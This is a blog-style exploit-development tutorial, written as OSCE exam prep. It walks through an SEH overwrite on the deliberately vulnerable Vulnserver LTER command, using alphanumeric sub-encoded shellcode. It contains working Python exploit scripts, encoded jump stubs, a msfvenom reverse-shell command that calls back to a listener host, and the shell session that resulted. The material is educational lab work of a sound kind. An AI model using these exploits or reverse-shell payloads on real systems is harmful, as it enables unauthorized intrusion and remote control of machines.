---
layout: single
title: CTP/OSCE Prep -- A Noob's Approach to Alphanumeric Shellcode (LTER SEH Overwrite)
date: 2019-6-01
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will be approaching an overflow in the `LTER` parameter trying to utilize all the tricks we've learned thus far. 

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be **light** on review! 

## Goals

For this post, our goal is to walk through the right way to do the SEH overwrite exploit to `LTER` on Vulnserver and learn a new technique for encoding shellcode. 

## Doyler (@doylersec) Shoutout

Just want to take a second and shoutout @doylersec for all of his help with this particular exploit. You should probably read his [blog post](https://www.doyler.net/security-not-included/vulnserver-lter-seh) on this exploit before anything else. It was a very clever solution and he was extremely charitable explaining it to me. 

On a sidenote, he's also partially responsible for me getting a few certifications. The content on his blog led me down several challenging and rewarding paths and I don't think it's an exaggeration to say that I wouldn't be where I am today without his content. 

*The content you publish for others to learn is important and can have a huge impact!*

## Alphanumeric Shellcode

As we discovered in the [previous post](https://h0mbre.github.io/LTER_SEH_Exploit/), this particular command, `LTER`, is filtering for alphanumeric shellcode. To reiterate, that restricts us to the following characters: 
```terminal_session
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
```

One way to overcome this limitation is to 'sub encode' your shellcode. As VelloSec explains in [CARVING SHELLCODE USING RESTRICTIVE CHARACTER SETS](http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/), the manual process for sub encoding your payloads can be very tedious. I really recommend you read the VelloSec blog post. I probably had to read it through 6 times today. 

### Wrap Around Concept
One thing you need to know is, if you subtract your 4 byte payload from `0`, the value will wrap around. Let's use the Windows calculator to show this. To make things simple let's use a forbidden character of `\xf7` and show how we could get that somewhere on the stack without ever using it via sub encoding. 
1. First, we subtract `f7` from `0`. 

![](/assets/images/CTP/calc3.JPG)

2. We end up with `FFFF FFFF FFFF FF09`. We can ignore the proceeding `f` chars. 
3. Now that we have our value `09`, we need to manipulate it so that it ends up equaling `f7` without us ever using a forbidden character. 
4. Our next job is come up with 3 numbers that added together will equal our `09`. We'll use `04`, `03`, and `02`.
5. If we then use **three** `SUB` instructions, we can reach our original `f7` value. 
6. `0` - `4` = `FFFF FFFF FFFF FFFC‬`
7. `FFFF FFFF FFFF FFFC‬` - `3` = `FFFF FFFF FFFF FFF9‬`
8. `FFFF FFFF FFFF FFF9‬` - `2` = `FFFF FFFF FFFF FFF7`

As you can see, we ended up back at our `F7` without ever using it! That fundamental concept will be similar to what we use throughout this exploit. 

### Automating Encoding 
At a high-level what we're going to accomplish with sub encoding and how we're going to use it in this exploit is: 
1. We're going to use `AND` operations to zero out the `EAX` register,
2. We're going to manipulate the `EAX` register with `SUB` and `ADD` instructions so that it eventually holds the value of our intended 4 byte payload,
3. We're going to push that value onto the stack so that `ESP` is pointing to it. 

As VelloSec put it lightly, manual encoding each 4 byte string can be tedious (especially if at some point you have to encode an entire reverse shell payload). Luckily, @ihack4falafel (Hashim Jawad) has created an amazing encoder called [Slink](https://github.com/ihack4falafel/Slink) for us to use. His encoder uses more `ADD` instructions. 

Let's show an example of how to use the tool with the test payload: `\xfe\xcf\xff\xe3`

![](/assets/images/CTP/test1.gif)

As you can see, the tool took almost no time at all to encode our payload. One thing to note, Slink only encodes 4 bytes at a time so if you submit a payload that's longer than 4 bytes make sure you grab **ALL** the output from Slink. A good thing to look out for is the `Shellcode final size:`.

### Using Encoded Payloads 
So now that we have our encoded payload, how do we get this to actually execute? As you can see, the final instruction in our encoded payload is always `\x50` or `push EAX`. This is going to place the value of `EAX` ontop of the stack and decrement `ESP` by 4 bytes. What does this mean? This means that wherever `ESP` is, when we go through our `SUB` instructions and push `EAX`, `ESP - 4` is going to be where our code is that we want to execute. To demonstrate, let's use some actual code we use in the exploit. 

Let's say we want to short-jump backwards (or negative) the maximum amount. The code to do this is `\xeb\x80`. Obviously we can't use `\xeb` or `\x80` as both of these bytes are not in our allowable range. Let's leverage Slink!

![](/assets/images/CTP/test2.gif)

Now we have our code:
```terminal_session
jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50"                 ## push eax 
```

Once we complete the `add  eax, 0x40404075` line, `EAX` will hold the value `909080EB`. This is dark magic.
Now when we `push eax`, `909080EB` will go into the 4 bytes "below" (really above visually, but below address wise as the stack grows in address size as it goes down) `ESP` and then `ESP` will be decremented by 4. 

So how can we use this? Well if we move our ESP to an advantageous spot before using our encoded shellcode, we could have execution finish our decoder, place our desired value onto the stack right below our decoder, and then control will pass to our desired value (shellcode). 

### Moving ESP Before Decoding
First, what is meant by 'decoding' in this context? Decoding happens when we push `EAX` onto the stack, this places our real code (the value held by `EAX`) right below `ESP`. 

So if our decoded shellcode is going to end up right below `ESP`, we need to know where that is and we need to move it to a location we want so that the program execution goes to it before going over other, potentially harmful instructions. 

To explain, here are some high-level diagrams. 

If we *DON'T* move `ESP`:

![](/assets/images/CTP/no1ESP.JPG)

As you can see in our fake program, there's a lot of space between where the code execution is and where our decoded payload is. We want our decoded payload closer to our execution so that execution can pass into our shellcode. The mechanism we are going to use to do this is very simple. Let's break out the Assembly and demonstrate it. Let's say our current `ESP` is `0178ffe9` and we need it to be at `0178ff6a`. What we're going to do is:
1. Find the difference between the two addresses (`0178ffe9` - `0178ff6a` = `7f`),
2. Push the value inside `ESP` (`0178ffe9`) onto the top of the stack,
3. Pop the value off of the top of the stack and into `EAX`,
4. Subtract `7f` from `EAX`,
5. Push `EAX` onto the stack,
6. and finally, pop the value off the top of the stack (our adjusted value of `0178ff6a`) into `ESP`. 

In Assembly:
```nasm
global_start

section .txt
_start:

push esp
pop eax
sub al, 0x7f
push eax
pop esp
```

After dumping the hex:
```terminal_session
astrid:~/ # objdump -D ./test


Disassembly of section .txt:

08049000 <_start>:
 8049000:	54                   	push   %esp
 8049001:	58                   	pop    %eax
 8049002:	2c 7f                	sub    $0x7f,%al
 8049004:	50                   	push   %eax
 8049005:	5c                   	pop    %esp
```

Now `ESP` holds our desired value and is where we want it. We can now safely decode our payload have the decoded payload end up closer to our execution. 

Let's walkthrough the simplest example from the exploit so that we can solidify this concept. Once we solidify the 'Move ESP --> Decode Payload --> Execute Decoded Payload' concept, we are ready for the exploit. 

### Walking Through Negative Jump

For this walkthrough, we'll be using the short negative jump we encoded earlier: `\xeb\x80\x90\x90`

The instances of `\x44` (`INC ESP` OR '`D`' values in ASCII) are on the stack because of our overflow.

### Step #1
Here is our starting point. As you can see, `ESP` is currently at `0196ECA4`. Once we execute the `PUSH EAX` instruction at `0196FFE8`, our decoded jump will be placed right below `ESP` and `0196ECA4` isn't even on our page or anywhere close to where our execution will be and we want to use it to jump before control is passed to something else.

![](/assets/images/CTP/Step1.JPG)

### Step #2
After executing the `PUSH ESP` we have the following register values. 

![](/assets/images/CTP/Step2.JPG)

### Step #3
After executing the `POP EAX` you can see that value of `ESP` is now stored in `EAX`. This address is lower (in value, above us graphically) than we are right now, so we have to add to it to get it to us. 

![](/assets/images/CTP/Step3.JPG)

### Step #4
After adding `0x134b` to our `EAX`, it's now pointing to `017EFFEF` which we can see as being about 8 bytes away from our last instruction (`PUSH EAX`). 

![](/assets/images/CTP/Step4.JPG)

### Step #5
We've now pushed `EAX` onto the stack.

![](/assets/images/CTP/Step5.JPG)

### Step #6
Now that we've executed `POP ESP`, `ESP` is pointing to the address `017EFFEF`!

![](/assets/images/CTP/Step6.JPG)

### Step #7
Next, we'll `AND EAX` twice to zero the register out. If you need help understanding this part, refer to the VelloSec post, which does a great job explaining it. As you can see `EAX` now has a value of `00000000`. 

![](/assets/images/CTP/Step7.JPG)

### Step #8
After these two `ADD` instructions, `EAX` is now holding our payload `909008EB`. 

![](/assets/images/CTP/Step8.JPG)

### Step #9
Finally, we execute `PUSH EAX` which will push our payload `909008EB` right ontop of `ESP` which is pointed at `017EFFEF`. Our red `JMP` command pops onto our stack and we are overjoyed that everything went as planned and that we will soon execute a jump backwards.

![](/assets/images/CTP/Step9.JPG)

### Summary

To kind of summarize our concerns during this process of: adjusting `ESP`, sending encoded shellcode, and finally decoding it, we need to keep a few things in mind. If we have a buffer space thats say 100 bytes, we can place our `ESP` adjustment **code** starting at byte `0`, our encoded shellcode will go right after our `ESP` adjustment, and finally our `ESP` should be adjusted to point at the **bottom** of our buffer space (near byte 100).

This is because as our encoded shellcode gets decoded, it is placed on top (visually) of `ESP` and so it is growing upwards into lower memory addresses. It is growing **towards** our encoded shellcode. 

![](/assets/images/CTP/decodeexplainer.JPG)

If we were to encode a payload like `\xaa\xaa\xaa\xaa\xff\xff\xff\xff`, Slink would encode the `\xff` bytes first so that as our payload is decoded those would be placed 'ontop' of `ESP` first and then the `\xaa` bytes would be placed 'ontop' of the `\xaa` bytes.

So as we consider using encoded shellcode, we have to remember that not only do we need room in our buffer for the encoded payload, but also enough room for the decoded payload as it's growing 'upward'. If we do not have enough room, it's possible that as the decoded instructions build up to our encoded payload and they overwrite eachother. 

## Building the Exploit

If you have no experience with SEH overwrite exploits, definitely check out the [first one we did](https://h0mbre.github.io/SEH_Based_Exploit/) in the series before going any further as we won't really spend much time reviewing the basic SEH overwrite techniques. 

Again, this exploit methodology is largely the same as Doyler's as I leaned on his walkthrough heavily, but I still wanted to share it to highlight the techniques it teaches. 

### Overwriting SEH
We will pick up at the SEH overwrite which is where we left off in the last post. We know we're restricted to alphanumeric shellcode. Let's overflow the SEH components and then find our offsets with Mona. 

If we send our `A` value buffer we overwrite both 4 byte components of the SEH chain. 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * 4000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

![](/assets/images/CTP/LTERsehoverwrite.JPG)

After using Mona to determine the offsets, we see that we overwrite SEH at 3514 bytes. So our new payload looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * 3514
buffer += 'B' * 4
buffer += 'C' * 4
buffer += 'D' * (4000 - 3514 - 4 - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

And we can verify that we have overwritten SEH appropriately:

![](/assets/images/CTP/LTERsehoffset.JPG)

And our stack looks great!

![](/assets/images/CTP/LTERgoodstack.JPG)

Next we need to place a `POP POP RET` into our `C` buffer space. Let's let Mona do the dirty work with a `!mona seh -cp ascii` command. 

![](/assets/images/CTP/LTERseh.JPG)

Let's use one of the `essfunc.dll` gadgets and grab the one at address `6250172B`.

Next we need to place jump code into the 'next SEH record' space that will land us in our `D` value buffer. Let's use our trust 'Net Jump' technique since `EB` is restricted. We'll accomplish this by juxtaposing the opcodes \x74 (JZ) and \x75 (JNZ) and jump lengths of `0x06` and `0x04`. Since one of these is always true, we will end up in our `D` buffer. 

So now our exploit looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'
Seh = '\x2b\x17\x50\x62'

buffer = 'A' * 3514
buffer += nSeh
buffer += Seh
buffer += 'D' * (4000 - 3514 - 4 - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

As you can see, this jumps us into our `D` buffer. **Don't forget to put a breakpoint at our `nSeh` jump code so you can step through from here going forward.**

We: 
1. land in our current SEH address which is a `POP POP RET`,
2. we use `POP POP RET` to jump up into our 'next SEH' byte-space which holds jump code, 
3. we jump into our `D` buffer. 

![](/assets/images/CTP/LTERdbuff.JPG)

EIP is pointed at the top of our `D` buffer, we're good to go. This `D` buffer isn't large enough for much code. We also don't have enough room to encode an egghunter. We don't even have enough room to set up an encoded long jump back (I tried, boy did I try.) Let's use our aforementioned negative jump back that we went over in the Alphanumeric section of the post.

### First Negative Jump Back
First thing we need to do is `push esp` and `pop eax` so that we can set up `ESP` to near the bottom of our `D` buffer so that our decoded code will appear right above it visually and we'll be able to pass execution to our jump back. 

Using `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` (thanks @AnubisOnSec!), we can get those opcodes easily. 
```terminal_session
astrid:~/ # /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
```

So our first code in our `D` buffer will be: `\x54\x58`

Next, we have to figure out the difference between `EAX` and where we want it. `EAX` is currently pointed at `0174ECA4` since we put the `ESP` value in there. We want it near the bottom of our `D` buffer so that it's near once our decoded shellcode appears on top of it. I picked the address `0174FFEF` and then calculated the difference. (`0174FFEF` - `0174ECA4` = `134B`). So we need to move up `134B` spaces. Let's get the opcodes in the nasm shell. 
```terminal_session
nasm > add ax, 0x134b
00000000  66054B13          add ax,0x134b
```

Ok so `EAX` will now hold the value `174FFEF`, now to just push that value back into `ESP`. 
```terminal_session
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

So the rest of our code to prepare `ESP` is: `\x66\x05\x4b\x13\x50\x5C`.
Let's add the variable `espAdj` to our exploit which now looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'
Seh = '\x2b\x17\x50\x62'
espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'

buffer = 'A' * 3514
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'D' * (4000 - 3514 - len(nSeh) - len(Seh) - len(espAdj))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

And let's run it and see how well we did. If all went well, when we step through this code in the `D` buffer, `ESP` should be pointing at our desired address for it `0174FFEF`. 

![](/assets/images/CTP/LTERespalign.JPG)

As you can see we were successful! 

### Encoding/Decoding a Short Jump Backwards

Now that we know where our decoded shellcode will appear (visually right above `ESP`), we are free to put our encoded jump backwards into our shellcode. After feeding the shellcode `\xeb\x80\x90\x90` to Slink, we get the following encoded payload: 
```terminal_session
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50"
```

So let's add this to our payload, which now looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'
Seh = '\x2b\x17\x50\x62'
espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50" 


buffer = 'A' * 3514
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += jump
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Let's send this and do a before and after for our Encoded/Decoded payload. If it is done correctly, a red `JMP` instruction should pop out of thin air visually on top of `ESP` once we execute the last part, the `\x50` (push `EAX`). 

**BEFORE**

![](/assets/images/CTP/LTERb4.JPG)

**AFTER**

![](/assets/images/CTP/LTERafter.JPG)

It totally worked and now we will let execution pass down to our new `JMP` operation and we will jump backwards and land in our `A` buffer!!

### Encoding a Second Jump Backwards

After executing our first jump, we are now sitting at `0177FF6D`  inside of our `A` buffer as you can tell from the screenshot.

![](/assets/images/CTP/inthemiddle.JPG)

We can scroll down in our top-left pane and find out the address that this buffer runs into our SEH component code. 

![](/assets/images/CTP/endofbuffer.JPG)

As you can see, the last address space before we run into our SEH overwrite code is `0177FFC3`. Let's subtract our current location from this to determine how many bytes we have to play with: (`0177FFC3` - `0177FF6D` = `56` or 86 in decimal). So we have ~86 bytes to play with. Not quite enough for anything besides possibly a longer jump. The longer jump will be performed by setting a register value to the location of the beginning of our `A` buffer and then jumping to that register with a `call` instruction. 

But first, we need to reset ESP so that our decoded shellcode will appear where we want it. Let's place it right at the end of our `A` buffer so that we have max room. Currently `ESP` points to `0177FFED` so to figure out how much to subtract to get it to `0177FFC3`, we just subtract (`0177FFED` - `0177FFC3` = `2A`). So our `ESP` adjustment code will be:
```terminal_session
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > sub al, 0x2a
00000000  2C2A              sub al,0x2a
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

So we'll put the variable `espAdj2` and set it equal to: `\x54\x58\x2c\x2a\x50\x5c`. 

We need to calculate how many `A` chars will come before our `espAdj2` code. The `A` buffer starts at `0177F20A`, so to calculate we do: (`0177FF6D` - `0177F20A` = `D63` or 3427 in decimal). 

So we need 3427 `A` chars in our buffer before our `espAdj2` code starts and then we'll put padding after it as well letting python work out the math required. Our exploit code now looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'

jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50" 

espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'

buffer = 'A' * 3427
buffer += espAdj2
buffer += 'A' * (3514 - 3427 - len(espAdj2))
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += jump
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Using this code and stepping through it to the beginning of our `espAdj2` code and we end up here: 

![](/assets/images/CTP/endofbuffer.JPG)

Let's step through it all and see if at the end `ESP` points to `0177FFC3`.

![](/assets/images/CTP/espworked.JPG)

Success! 

### Encoding a Long Negative Jump

Instead of a short jump like we previously did we need to long jump so that we have some actual space for some shellcode. As we already figured out, we have over 3000 bytes between our `espAdj2` code and the beginning of our `A` buffer. 

To accomplish this, we'll push `ESP`, pop `ESP` into a register (`EBX`), subtract x-amount of bytes from it so that it ends up holding the address of the beginning of our `A` buffer `017DF20A`, and then finally jump to it with a `CALL` instruction. 

`ESP` is currently `017DFFC3` so we subtract `017DF20A` and get a difference of `DB9`. Time for some Assembly!
```terminal_session
nasm > push esp
00000000  54                push esp
nasm > pop ebx
00000000  5B                pop ebx
nasm > sub ebx, 0xdb9
00000000  81EBB90D0000      sub ebx,0xdb9
nasm > call ebx
00000000  FFD3              call ebx
```

So now we have our shellcode that we need encoded: `\x54\x5b\x81\xeb\xb9\x0d\x00\x00\xff\xd3`. 

Since `\x54\x5b` aren't restricted, we need to just prepend these to our encoded shellcode and leave them unencoded. This is a nice trick. If we were to encode `\x54\x5b\x81\xeb\xb9\x0d\x00\x00\xff\xd3` with Slink, our encoded shellcode would be **83 bytes**. However, if we just encode `\x81\xeb\xb9\x0d\x00\x00\xff\xd3`, our encoded shellcode is **52 bytes**, that's a huge difference!

Slink gives us the following encoded shellcode:
```terminal_session
Enter your shellcode: \x81\xeb\xb9\x0d\x00\x00\xff\xd3
Enter shellcode variable name: longJump
[+] Shellcode size is divisible by 4
[*] Encoding [d3ff0000]..
[!] Possible bad character found, using alterantive encoder..
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
[*] Encoding [0db9eb81]..
[+] No bad character found, using default encoder..
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
longJump += "\x50"                 ## push eax
[*] Shellcode final size: 52 bytes
```

So we add our `longJump` variable to our exploit which now looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'

jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50" 

espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'

longJump = "\x54\x5b"
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
longJump += "\x50"


buffer = 'A' * 3427
buffer += espAdj2
buffer += longJump
buffer += 'A' * (3514 - 3427 - len(espAdj2) - len(longJump))
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += jump
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Once we send this, we should see our encoded long jump payload get decoded and then execution eventually reach our decoded payload on the stack and take it and jump all the way back to the beginning of our `A` buffer. Let's do another before and after. 

**BEFORE**

![](/assets/images/CTP/before2.JPG)

**AFTER**

![](/assets/images/CTP/after2.JPG)

As you can see, our `CALL EBX` instruction pops out of thin air onto our stack and we eventually will pass control to it and jump back to the beginning of our `A` buffer!

### Finally, Our Last Payload
You know what time it is. It's time to do the thing we already did twice one more time, except this time, with reverse shell shellcode instead of jumps. 

Let's first align `ESP` to the absolute bottom of our padding before our encoded second jump. We land here, at `017CF20A`. 

![](/assets/images/CTP/land.JPG)

`ESP` is `017CFFB7`. 

The bottom of our `A` buffer before we hit our `espAdj2` code is `017CFF6C`. So to find out how much we need to adjust `ESP` we do: (`017CFFB7` - `017CFF6C` = `4B`). So we need to subtract `4B` from our `ESP` register value. To the Assembly:
```terminal_session
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > sub ax, 0x4b
00000000  6683E84B          sub ax,byte +0x4b
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

So our `espAdj3` code is going to be: `\x54\x58\x2c\x4b\x50\x5c`

Let's add and test it. Our exploit code now looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'

jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50" 

espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'

longJump = "\x54\x5b"
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
longJump += "\x50"

espAdj3 = '\x54\x58\x2c\x4b\x50\x5c'

buffer = espAdj3
buffer += 'A' * (3427 - len(espAdj3))
buffer += espAdj2
buffer += longJump
buffer += 'A' * (3514 - 3427 - len(espAdj2) - len(longJump))
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += jump
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

After stepping through it, we see that `ESP` is pointed at `018BFF6C` just like we wanted. 

![](/assets/images/CTP/finaladj.JPG)

All that's left to do at this point is generate our reverse shell payload and encode it. I used: 
```terminal_session
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.206 LPORT=443 -f c -b '\x00' BufferRegister=ESP
```

And then fed this shellcode to Slink. There are a few different ways to get only the shellcode out of the Slink output, I used bash for the most part.

I decided to place the final exploit code at the very bottom of this post since it is obnoxiously long. (Shellcode encoded was over 2200 bytes). 

Adding our shellcode to our exploit code nets us our reverse shell! Whoohoo!
```terminal_session
astrid:~/ # nc -lvp 443                                                                                                                
listening on [any] 443 ...
192.168.1.201: inverse host lookup failed: Unknown host
connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49422
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop>
```

## End Game

What a journey that was. To summarize I made a little diagram of what happened at a high level. 

![](/assets/images/CTP/endgame.JPG)

## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I’m super appreciative. Truly mean it.

## Resources
+ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
+ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
+ [Doyler LTER SEH Overwrite Part 1](https://www.doyler.net/security-not-included/lter-seh-continued)
+ [Doyler LTER SEH Overwrite Part 2](https://www.doyler.net/security-not-included/lter-seh-continued)
+ [VelloSec Carving Shellcode](http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/)
+ [Slink by @ihack4falafel](https://github.com/ihack4falafel/Slink)

## Final Exploit Code
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'

jump = ""
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jump += "\x50" 

